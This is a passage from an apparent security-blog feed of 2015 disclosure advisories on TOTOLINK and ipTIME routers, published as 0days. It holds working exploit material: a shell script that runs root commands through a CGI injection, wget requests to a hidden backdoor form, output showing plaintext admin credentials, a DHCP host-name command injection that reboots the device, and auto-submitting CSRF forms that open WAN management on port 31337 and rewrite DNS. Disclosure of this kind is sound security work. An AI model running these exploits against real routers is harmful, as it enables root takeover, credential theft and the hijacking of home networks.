<pre><code>echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555

if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
</code></pre>
<p><strong>HTTP remote management interface open with the backdoor:</strong></p>
<p><img alt="" src="images/2015-totolink-0x02-backdoor-01.png" /></p>
<h2>Details - RCE in the management interface - CVE-2015-9551</h2>
<p>A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:</p>
<pre><code>POST /boafrm/formSysCmd HTTP/1.1

sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
</code></pre>
<p>An attacker can use wget to execute commands in the remote device:</p>
<pre><code>wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
</code></pre>
<p>For instance, sending this HTTP request to the management interface will reboot the device:</p>
<pre><code>POST /boafrm/formSysCmd HTTP/1.1

sysCmd=reboot&amp;apply=Apply&amp;msg=
</code></pre>
<p>This wget command will do the same job:</p>
<pre><code>wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
</code></pre>
<h2>Vendor Response</h2>
<p>TOTOLINK was not contacted in regard of this case.</p>
<h2>Report Timeline</h2>
<ul>
<li>Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.</li>
<li>Jun 26, 2015: working PoCs with RCE.</li>
<li>Jul 16, 2015: A public advisory is sent to security mailing lists.</li>
<li>Nov 24, 2020: MITRE provides CVE-2015-9550, CVE-2015-9551.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).</p>
<h2>References</h2>
<p>https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html</p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p></content>
    </entry>
    
    <entry>
        <title>15 TOTOLINK router models vulnerable to multiple RCEs</title>
        <link href="2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: 15 TOTOLINK router models vulnerable to multiple RCEs
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerabilities Summary

The first vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single HTTP request.

The second vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single DHCP request.

There are direct RCEs against the routers which give a complete root access to the embedded Linux from the LAN side.

The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to the latest firmwares with the default configuration:

- - TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin)
- - TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin)
- - TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin - totolink.net)
- - TOTOLINK EX300 : until last firmware (9.36 - ex300_ch_9_36.bin.5357c0 - totolink.cn)
- - TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0)
- - TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin)
- - TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin)
- - TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin)
- - TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin)
- - TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK N302R Plus V1_en_8_82.bin)
- - TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK N302R Plus V2_en_9_08.bin)
- - TOTOLINK A3004NS (no firmware available in totolinkusa.com but ipTIME's A3004NS model was vulnerable to the 2 RCEs)
- - TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)


The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares to the latest firmwares with the default configuration:

- - TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin)
- - TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)


Firmwares come from totolink.net and from totolink.cn.

- - From my tests, it is possible to use these vulnerabilities to overwrite the firmware with a custom (backdoored) firmware.

Concerning the high CVSS score (10/10) of the vulnerabilities and the longevity of this vulnerability (6+ year old),
the TOTOLINK users are urged to contact TOTOLINK.



## Details - RCE with a single HTTP request

The HTTP server allows the attacker to execute some CGI files.

Many of them are vulnerable to a command inclusion which allows to execute commands with the http daemon user rights (root).


Exploit code:

$ cat totolink.carnage
#!/bin/sh
if [ ! $1 ]; then
echo "Usage:"
echo $0 ip command
exit 1
fi
wget -qO- --post-data="echo 'Content-type: text/plain';echo;echo;PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh


The exploits have been written in HTML/JavaScript, in form of CSRF
attacks, allowing people to test their systems in live using their
browsers:
http://pierrekim.github.io/advisories/


o Listing of the filesystem

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-listing.of.the.filesystem.html

Using CLI:

root@kali:~/totolink# ./totolink.carnage 192.168.1.1 ls | head
ash
auth
busybox
cat
chmod
cp
d.cgi
date
echo
false
root@kali:~/totolink#


o How to retrieve the credentials ? (see login and password at the end of the text file)

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-dump.configuration.including.credentials.html

Using CLI:

kali# ./totolink.carnage 192.168.1.1 cat /tmp/etc/iconfig.cfg
wantype.wan1=dynamic
dhblock.eth1=0
ppp_mtu=1454
fakedns=0
upnp=1
ppp_mtu=1454
timeserver=time.windows.com,gmt22,1,480,0
wan_ifname=eth1
auto_dns=1
dhcp_auto_detect=0
wireless_ifmode+wlan0=wlan0,0
dhcpd=0
lan_ip=192.168.1.1
lan_netmask=255.255.255.0
dhcpd_conf=br0,192.168.1.2,192.168.1.253,192.168.1.1,255.255.255.0
dhcpd_dns=164.124.101.2,168.126.63.2
dhcpd_opt=7200,30,200,
dhcpd_configfile=/etc/udhcpd.conf
dhcpd_lease_file=/etc/udhcpd.leases
dhcpd_static_lease_file=/etc/udhcpd.static
use_local_gateway=1
login=admin
password=admin

Login and password are stored in plaintext, which is a very bad security practice.


o Current running process:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-current.process.html

Using CLI:

kali# ./totolink.carnage 192.168.1.1 ps -auxww


o Getting the kernel memory:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-getting.kernel.memory.html

Using CLI:

kali# ./totolink.carnage 192.168.1.1 cat /proc/kcore


o Default firewall rules:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-default.firewall.rules.html

Using CLI:

kali# ./iptime.carnage.l2.v9.52 192.168.1.1 iptables -nL


o Opening the management interface on the WAN:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-opening.the.firewall.html


o Reboot the device:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-reboot.html


o Brick the device:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-bricking.the.device.html


An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.

By the way, d.cgi in /bin/ is an intentional backdoor.



## Details - RCE with a single DHCP request

This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD server in TOTOLINK devices allows remote attackers to execute arbitrary commands
via shell metacharacters in the host-name field.

Sending a DHCP request with this parameter will reboot the device:

cat /etc/dhcp/dhclient.conf

send host-name ";/sbin/reboot";

When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:


Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

[...]
WiFi Simple Config v1.12 (2009.07.31-11:35+0000).

Launch iwcontrol: wlan0
Reaped 317
iwcontrol RUN OK
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
WAN0 IP: 192.168.2.1
signalling START
Invalid upnpd exit
killall: upnpd: no process killed
upnpd Restart 1
iptables: Bad rule (does a matching rule exist in that chain?)
Session Garbage Collecting:Maybe system time is updated.( 946684825 0 )
Update Session timestamp and try it after 5 seconds again.
ez_ipupdate callback --&gt; time_elapsed: 0
Run DDNS by IP change:  / 192.168.2.1
Reaped 352
iptables: Bad rule (does a matching rule exist in that chain?)
Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file
Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist
Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048
Reaped 363
Led Silent Callback
Turn ON All LED
Dynamic Channel Search for wlan0 is OFF
start_signal =&gt; plantynet_sync
Do start_signal =&gt; plantynet_sync
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
Reaped 354
iptables: Bad rule (does a matching rule exist in that chain?)
ez_ipupdate callback --&gt; time_elapsed: 1
Run DDNS by IP change:  / 192.168.2.1
Burst DDNS Registration is denied: iptime -&gt; now:26
Led Silent Callback
Turn ON All LED
/proc/sys/net/ipv4/tcp_syn_retries: cannot create
- - - - ---&gt; Plantynet Event : 00000003
- - - - ---&gt; PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE


[sending the DHCP request]


[01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1 00:01:03 miniupnpd[370]: received signal 15, good-bye
Reaped 392
Reaped 318
Reaped 314
Reaped 290
Reaped 288
Reaped 268
Reaped 370
Reaped 367
- - - - ---&gt; PLANTYNET_SYNC_FREE_DEVICE
Restarting system.

Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Reboot Result from Watchdog Timeout!

- - - - ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz)
Delay 1 second till reset button
Magic Number: raw_nv 00000000
Check Firmware(05020000) : size: 0x001ddfc8 ----&gt;


[...]


An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.



## Vendor Response

Due to "un-ethical code" found in TOTOLINK products (= backdoors found in new TOTOLINK devices), TOTOLINK was not contacted in regard of this case, but ipTIME was contacted in April 2015 concerning the first RCE.



## Report Timeline

* Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in ipTIME products.
* Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products.
* Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products.
* Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and EX750 routers.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/MEAAoJEMQ+Dtp9ky28q5QP/iv9DnkWIYfVBsd9DCRjwkhp
bJDnignaI9xbQJxw40eCcDvaEhCVKrpwpbY0SA1e0uVwTAoZIZKOuI+VZR33dU9M
+YaaxrWz8mhGUis2WrtVufNKTjKKoIeefHn9n5fjg18BKVlTcVW4sMpJAUCbI/c7
7We3dAJgIuEVSScVHB9jsCRipZwsGzUfeLOqUboJHekmna4R2rxrVHs0noArMJdH
IucAskoOupBP7oiWH5ifsKQSBXxKVZZihukJbWhBDeO4R2jvwgVx5cgzsezRWz4U
EIO9skElbOKF8YWUzejMtVFP/lYVqfhixu3uoWmkVyVK4QwT8sM5mSk/xoBzc/9+
/SA1nSflRgfuD3RBHdmUGaM9dqyldlUggfHUvx6RMXsI/zI2LHk+0w6Bl/3vBuzG
MURIbiHm4T8SoKOC9nbPDSK9oaKoL/g0yYGkbtw87fuhYJP1Su2Xy+CG6LsBP2eM
LpxxgLGHl6HBX4pqrHaHBbureM+wrAFbHetp1SG0rjiUkXJLgwo9pbnx1a3oe7ik
gqQZRaveyQK+sOJdiCwgMTR4wsi3hoY+1UlntKil+XW0+Vf9arDwaTzrJs2zn1Us
qYspmrBsBibG4T4W/reCIGU3lTNyiOWi80qGgqzab0k2/MLU23YB6ktwz8AxzpTv
rXDUveDVcMt/YxA9/nKu
=XzCM
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>127 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request</title>
        <link href="2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


## Advisory Information

Title: 127 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request
Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x02.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html
Date published: 2015-07-06
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle entreprise Routers/WiFi APs/Modems/Firewalls in South Korea
with millions of devices deployed in the country. EFMNetworks ipTIME is occupying more than 60 percent of personal network devices.
There are =~ 10 000 000 of ipTIME devices deployed in South Korea.



## Vulnerability Summary

This vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single DHCP request.

This is a direct RCE against the routers which gives a complete root access to the embedded Linux from the LAN side.

It affects 127 ipTIME products from 2009-era firmwares to the current firwmare (9.66, built time 2015-06-11) with the default configuration:


- ipTIME a1004
- ipTIME a1004v
- ipTIME a104
- ipTIME a104ns
- ipTIME a104r
- ipTIME a2004
- ipTIME a2004ns
- ipTIME a2004r
- ipTIME a2008
- ipTIME a3004
- ipTIME a3004ns
- ipTIME a5004ns
- ipTIME a604
- ipTIME a604v
- ipTIME extac
- ipTIME extd2
- ipTIME g1
- ipTIME g104
- ipTIME g104a
- ipTIME g104be
- ipTIME g104i
- ipTIME g104m
- ipTIME g204
- ipTIME g501
- ipTIME g504
- ipTIME ipsmart
- ipTIME mini
- ipTIME mobap1
- ipTIME multi
- ipTIME n1
- ipTIME n104
- ipTIME n104a
- ipTIME n104ar1
- ipTIME n104i
- ipTIME n104k
- ipTIME n104ktt
- ipTIME n104m
- ipTIME n104p
- ipTIME n104q
- ipTIME n104r
- ipTIME n104r3
- ipTIME n104rsk
- ipTIME n104s
- ipTIME n104sr1
- ipTIME n104t
- ipTIME n104v
- ipTIME n104vlg
- ipTIME n1e
- ipTIME n1eky
- ipTIME n1p
- ipTIME n2
- ipTIME n2e
- ipTIME n2p
- ipTIME n3004
- ipTIME n5
- ipTIME n5004
- ipTIME n504
- ipTIME n5r1
- ipTIME n6004
- ipTIME n6004m
- ipTIME n6004r
- ipTIME n604
- ipTIME n604a
- ipTIME n604i
- ipTIME n604m
- ipTIME n604p
- ipTIME n604r
- ipTIME n604s
- ipTIME n604t
- ipTIME n604v
- ipTIME n604vlg
- ipTIME n608
- ipTIME n7004ns
- ipTIME n702bcm
- ipTIME n704
- ipTIME n704a
- ipTIME n704a3
- ipTIME n704bcm
- ipTIME n704lg
- ipTIME n704m
- ipTIME n704mlg
- ipTIME n704ns
- ipTIME n704s
- ipTIME n704v
- ipTIME n704v3
- ipTIME n8004
- ipTIME n8004r
- ipTIME n8004v
- ipTIME n804
- ipTIME n804a
- ipTIME n804a3
- ipTIME n804t
- ipTIME n804t3
- ipTIME n804v
- ipTIME n904
- ipTIME n904ns
- ipTIME n904v
- ipTIME ng104
- ipTIME ng304
- ipTIME ntq104
- ipTIME ntv108
- ipTIME ntv116
- ipTIME ntv124
- ipTIME q1
- ipTIME q304
- ipTIME q504
- ipTIME q604
- ipTIME t1004
- ipTIME t1008
- ipTIME t16000
- ipTIME t2008
- ipTIME t24000
- ipTIME t3004
- ipTIME t3008
- ipTIME timeve
- ipTIME tq204
- ipTIME tv104
- ipTIME v1016
- ipTIME v1024
- ipTIME v304
- ipTIME v308
- ipTIME v504
- ipTIME wre1
- ipTIME x3003
- ipTIME x3007
- ipTIME x5007
- ipTIME x6003


The probability that firmware 9.68 (last firmware for these specific models) running in the below products is vulnerable is VERY high:


- ipTIME q304
- ipTIME q1
- ipTIME q504
- ipTIME ew302
- ipTIME n702bcm
- ipTIME a3004ns
- ipTIME a5004ns


Concerning the high CVSS score (10/10) of the vulnerability, the number of affected devices and the longevity of this vulnerability (6+ year old),
the ipTIME users are urged to contact ipTIME.



## Details

This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD server in ipTIME devices allows remote attackers to execute arbitrary commands
via shell metacharacters in the host-name field.

Sending a DHCP request with this parameter will reboot the device:

cat /etc/dhcp/dhclient.conf

send host-name ";/sbin/reboot";

When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:


Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

[...]
WiFi Simple Config v1.12 (2009.07.31-11:35+0000).

Launch iwcontrol: wlan0
Reaped 317
iwcontrol RUN OK
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
WAN0 IP: 192.168.2.1
signalling START
Invalid upnpd exit
killall: upnpd: no process killed
upnpd Restart 1
iptables: Bad rule (does a matching rule exist in that chain?)
Session Garbage Collecting:Maybe system time is updated.( 946684825 0 )
Update Session timestamp and try it after 5 seconds again.
ez_ipupdate callback --&gt; time_elapsed: 0
Run DDNS by IP change:  / 192.168.2.1
Reaped 352
iptables: Bad rule (does a matching rule exist in that chain?)
Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file
Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist
Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048
Reaped 363
Led Silent Callback
Turn ON All LED
Dynamic Channel Search for wlan0 is OFF
start_signal =&gt; plantynet_sync
Do start_signal =&gt; plantynet_sync
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
Reaped 354
iptables: Bad rule (does a matching rule exist in that chain?)
ez_ipupdate callback --&gt; time_elapsed: 1
Run DDNS by IP change:  / 192.168.2.1
Burst DDNS Registration is denied: iptime -&gt; now:26
Led Silent Callback
Turn ON All LED
/proc/sys/net/ipv4/tcp_syn_retries: cannot create
- ---&gt; Plantynet Event : 00000003
- ---&gt; PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE


[sending the DHCP request]


[01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1 00:01:03 miniupnpd[370]: received signal 15, good-bye
Reaped 392
Reaped 318
Reaped 314
Reaped 290
Reaped 288
Reaped 268
Reaped 370
Reaped 367
- ---&gt; PLANTYNET_SYNC_FREE_DEVICE
Restarting system.

Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Reboot Result from Watchdog Timeout!

- ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz)
Delay 1 second till reset button
Magic Number: raw_nv 00000000
Check Firmware(05020000) : size: 0x001ddfc8 ----&gt;


[...]




An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.

- From my tests, it is possible to use this vulnerability to overwrite the firmware with a custom (backdoored) firmware.



## Vendor Response

- From my experience, contacting EFMNetworks ipTIME proved to be useless.
They don't publish security information in the changelog, they don't answer to security researchers and
they don't credit them either.
EFMNetworks ipTIME was not contacted in regard of this case.



## Report Timeline

* Jun 02, 2014: Vulnerability found by Pierre Kim.
* Apr 07, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jun 25, 2015: Vulnerability confirmed on all the existing versions from 2009 to 2015 including the last firmware version (9.66).
* Jul 06, 2015: A public advisory is sent to security mailing lists.



## Credit

This vulnerability was found by Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-iptime-0x02.txt



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/



-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVmcxDAAoJEMQ+Dtp9ky28/vgP/RexWVHpSEIxER8l/JbShcuC
mUKpgvxFzLNqFbqXRrf1obB7DhJ2H1q1e1Nq/w02QZDBnhN3A6e52cBFNw7SLQ9V
zuoNX3o/we9LkPN1rQsQniPiPp3GqtzgE8+mXzyWSgGBrk+9xa3Wymn3Z1VlZjUy
L+gmfYIgyv7RRnAOqZn8k2eJOFdrytp4I7RlGP9eBUas8M+Sd0Y9cFmF9OsaAJtC
SrerzyAt1onlNpeiMGWqI6hyqK/Fh2JSDzeYrYMZVjUgR/ffaLS+7WQSjByunCR5
XlpsgxGKqpqrpOd6IVdE9YMKS2/zi9oiEd3fRIxNHGZ+yjGHThK562lhLgm+aeMf
nRDMJaby4qvhztChktT8z0ie0C/3xW6I1K2VlEi+89Z5N6951TsZcFgUq65mLi7l
x0s3Q9BblZ21+W5nD3dJlK+F+NX6s0+MzAv44r4lAP4nuJ5k0zHw7LIHQ09boZX2
+4zJa1vZjFgsVCC0QgVdbpR3pPn9MSwsPiMOcqwZZALrJpQRljNm7+A/fKO9kDUx
z7MZVnoY2090EpspCrE3wA6AGYdrzVg3tc9U90hc+kdMRTR0cOpK5TDf9ArN6Bok
kTPhnpOftrEVYOA1JLeOvSPNFLYK193niQE46TrTlQMUVKsummhtTJY8oe+rtQMf
WHjFp48VR2JM+PMRW0BR
=c35o
-----END PGP SIGNATURE-----
</code></pre>
<p>More vulnerabilities regarding ipTIME products are likely to be released soon.</p></content>
    </entry>
    
    <entry>
        <title>ipTIME n104r3 vulnerable to CSRF and XSS attacks</title>
        <link href="2015-07-03-iptime-n104r3-vulnerable-to-CSRF-and-XSS-attacks.html"/>
        <content type="html"><p>The ipTIME n104r3 is a wireless LAN router. Its current firmware (9.58) with default configuration is vulnerable to CSRF-attacks and stored XSS attacks.</p>
<p>Click the links below to access to the exploits:</p>
<ul>
<li><a href="http://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers</a></li>
<li><a href="http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-change_dns_csrf_bypass.html">CSRF-attack changing the DNS configuration to 0.2.0.7 and 1.2.0.1</a></li>
<li><a href="http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-activate_admin_wan_csrf_bypass.html">CSRF-attack activating the remote control management on port 31337/tcp listening on the WAN interface</a>.</li>
</ul>
<p>CSRF-attack activating the remote control management on port 31337/tcp:
<img alt="" src="images/2015-iptime-0x01-remote-management.png" /></p>
<p>Stored XSS:</p>
<p><img alt="" src="images/2015-iptime-0x01-stored-xss.png" /></p>
<p>Complete advisory:</p>
<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512



## Advisory Information

Title: iptime n104r3 vulnerable to CSRF and XSS attacks
Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x01.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-03-iptime-n104r3-vulnerable-to-CSRF-and-XSS-attacks.html
Date published: 2015-07-03
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle entreprise Routers/WiFi APs/Modems/Firewalls in South Korea with millions of devices deployed in the country.
EFMNetworks ipTIME is occupying more than 60 percent of personal network devices.



## Vulnerability Summary

The ipTIME n104r3 is a wireless LAN router. Its current firmware (9.58) with default configuration is
vulnerable to CSRF-attacks and XSS attacks.
Since, its anti-CSRF protection is based on a static HTTP referrer (RFC 1945), an attacker can take over
most of the configuration and settings using anyone inside the LAN of the router. Owners are urged to
contact ipTIME, and activate authentication on this product (disabled by default).

Due to the fact the firmware seems to be used on several products, it is highly likely that other products
of ipTIME are vulnerable.
The probability that the N104T is also vulnerable is very high but I don't have possibility to test the
exploits against live ipTIME N104T routers.



## Details - CSRF

The HTTP interface allows to edit the configuration. This interface is vulnerable to CSRF.

Configuration and settings can be modified with CSRF attacks:
- Activate the remote control management
- Change the DNS configuration
- Update the firmware
- Change the Wifi Configuration
- Create TCP redirections to the LAN
- and more...


Example of forms exploiting the CSRF:


o Activating the remote control management on port 31337/tcp listening on the WAN interface.

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.0.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="SYS"&gt;
&lt;input type="hidden" name="GO" value="firewallconf_accesslist.html"&gt;
&lt;input type="hidden" name="nowait" value="1"&gt;
&lt;input type="hidden" name="SET0" value="17367296=31337"&gt;
&lt;input type="hidden" name="SET1" value="17236224=1"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


o Changing the DNS configuration to 0.2.0.7 and 1.2.0.1:

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.0.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="WAN"&gt;
&lt;input type="hidden" name="GO" value="netconf_wansetup.html"&gt;
&lt;input type="hidden" name="SET0" value="50397440=2"&gt;
&lt;input type="hidden" name="SET1" value="50856960=64-E5-99-AA-AA-AA"&gt;
&lt;input type="hidden" name="SET2" value="235077888=1"&gt;
&lt;input type="hidden" name="SET3" value="235012865=0.2.0.7"&gt;
&lt;input type="hidden" name="SET4" value="235012866=1.2.0.1"&gt;
&lt;input type="hidden" name="SET5" value="51118336=0"&gt;
&lt;input type="hidden" name="SET6" value="51839232=1"&gt;
&lt;input type="hidden" name="SET7" value="51511552=1500"&gt;
&lt;input type="hidden" name="SET8" value="117834240="&gt;
&lt;input type="hidden" name="SET9" value="117703168="&gt;
&lt;input type="hidden" name="SET10" value="117637376=1492"&gt;
&lt;input type="hidden" name="SET11" value="51446016=1500"&gt;
&lt;input type="hidden" name="SET12" value="50463488=192.168.1.1"&gt;
&lt;input type="hidden" name="SET13" value="50529024=255.255.255.0"&gt;
